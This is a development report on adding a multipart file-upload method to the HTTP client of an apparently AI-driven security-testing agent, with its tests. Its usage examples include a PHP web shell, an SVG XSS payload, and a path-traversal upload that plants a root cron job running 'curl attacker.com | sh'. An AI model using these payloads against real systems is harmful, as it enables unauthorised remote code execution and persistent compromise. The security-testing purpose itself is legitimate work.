# V4 Phase 7 Completion — Multipart Form-Data in HttpClient

## Summary

Implemented Phase 7 of the V4 enrichment plan: `HttpClient` now has a first-class `upload()` method for sending `multipart/form-data` requests with file uploads. File upload vulnerability testing (unrestricted upload → RCE, path traversal via filename, XSS via SVG/HTML) is now a native operation rather than a manual raw-body construction exercise.

## Why

This phase makes file upload testing a first-class operation for the agent.

Before this change:

- testing file upload vulnerabilities required manually constructing multipart boundaries in a raw string body
- this approach was error-prone, fragile, and required the agent to know the exact multipart encoding spec
- there was no way to send multiple files or mix file fields with text fields cleanly
- no history was recorded for upload requests in a readable form

After this phase:

- `http_client.upload()` accepts a typed `files` dict and optional `fields` for text form data
- httpx handles multipart boundary construction automatically — the agent never touches encoding details
- all upload requests are recorded to HTTP history with a human-readable body summary
- network errors, body size caps, and redirect tracking work identically to `request()`

## What Changed

### 1. New `upload()` method

**File:** `src/boba/interaction/http.py`

New method with signature:

```python
async def upload(
    self,
    method: str,
    url: str,
    files: dict[str, tuple[str, bytes, str]],  # {field: (filename, content, content_type)}
    fields: dict[str, str] | None = None,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    source: str = "http_client",
    tags: list[str] | None = None,
    follow_redirects: bool = True,
    timeout_seconds: float | None = None,
) -> HttpResponse:
```

Key behaviors:

- **`files=` not `content=`**: passes `files=` and `data=` to httpx instead of `content=`, which is how httpx knows to build a multipart body with a generated boundary. Passing `Content-Type` manually would suppress httpx's boundary injection — the method intentionally does not set it.
- **History recording**: since there is no single string body, records a human-readable summary `<multipart: files=[...], fields=[...]>` to `request_body` in http_history — enough for audit purposes without storing raw file bytes.
- **Network error handling**: catches `httpx.RequestError` and returns `status_code=0` with a history record tagged `network_error`, identical to `request()`.
- **Body size cap**: response bodies exceeding `max_response_bytes` are truncated with a warning, identical to `request()`.
- **Redirect tracking**: captures `resp.history` into `redirect_chain`, identical to `request()`.
- **Timeout**: `timeout_seconds` is forwarded to httpx only when provided; otherwise the client-level default applies.

### 2. Agent experience after this phase

```python
# Test for unrestricted file upload (RCE)
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={
        "avatar": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    },
    fields={"description": "Profile photo"},
    source="test_upload",
)
# If status_code == 200, check if the uploaded file is accessible at a predictable path

# Test for XSS via SVG upload
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={
        "file": ("xss.svg", b'<svg><script>alert(1)</script></svg>', "image/svg+xml"),
    },
)

# Test for path traversal via filename
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={
        "file": ("../../../etc/cron.d/backdoor", b"* * * * * root curl attacker.com | sh", "text/plain"),
    },
)
```

## Tests Added

**File:** `tests/interaction/test_http.py`

8 new tests in `TestUpload`:

1. `test_upload_single_file_returns_response` — basic upload returns correct status and body
2. `test_upload_uses_files_kwarg_not_content` — verifies httpx receives `files=` (not `content=`) and text fields go as `data=`
3. `test_upload_multiple_files` — two files in a single request are passed correctly
4. `test_upload_recorded_to_history` — sink records the request with `multipart` body summary containing the filename
5. `test_upload_cookies_and_headers_forwarded` — Authorization header and session cookies are passed through to httpx
6. `test_upload_custom_timeout_forwarded` — `timeout_seconds` is forwarded to httpx call
7. `test_upload_body_size_cap` — response bodies exceeding `max_response_bytes` are truncated to the cap
8. `test_upload_network_error_returns_zero_status` — `httpx.RequestError` produces `status_code=0` and empty body

## Validation

- `pytest tests/interaction/test_http.py::TestUpload -v` — **8 passed**
- `pytest --tb=no -q` — **722 passed**, 0 failures, 0 regressions

## Test Count

| Phase | Tests |
|---|---|
| Baseline (after Phase 6 + audit fixes) | 714 |
| Phase 7 new tests | 8 |
| **Total** | **722** |

## Notes / Trade-offs

- `upload()` is a standalone method, not an extension of `request()`. The two share the same sink recording pattern and error handling structure, but `request()` uses `content=` (raw bytes) while `upload()` uses `files=` + `data=` — these are mutually exclusive in httpx and cannot be unified without a messy conditional.
- The `request_body` stored in history is a summary string, not the actual multipart-encoded bytes. This is intentional: storing raw file content in SQLite would bloat the database and is not useful for audit. The summary gives enough context to understand what was sent.
- `Content-Type: multipart/form-data; boundary=<generated>` is set by httpx automatically. The method documents this explicitly to prevent future contributors from manually setting the header (which would break the boundary).
- File upload vulnerability testing still requires the agent to verify that uploaded files are accessible at a predictable path — `upload()` only handles the request half. The agent decides what to upload and whether the response indicates success.
